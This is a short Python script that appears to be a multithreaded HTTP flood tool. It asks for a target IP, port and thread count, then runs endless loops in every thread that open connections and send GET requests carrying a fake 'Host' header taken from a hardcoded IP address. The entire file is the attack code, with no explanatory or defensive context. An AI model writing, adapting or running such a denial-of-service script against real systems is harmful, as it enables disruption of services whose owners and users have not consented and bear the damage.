import socket
import threading
import os  

global attack_num
attack_num = 0

target = str(input("Insert target’s IP: "))
port = int(input("Insert Port: ")) #80 pour http par exemple
Trd = int(input("Insert number of Threads: "))
fake_ip = '44.197.175.168'

os.system("clear")
os.system("toilet Toolname")

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        s.close()
        
        global attack_num
        attack_num += 1
        print(attack_num)


if __name__ == "__main__":
    for i in range(Trd):
        thread = threading.Thread(target=attack)
        thread.start()

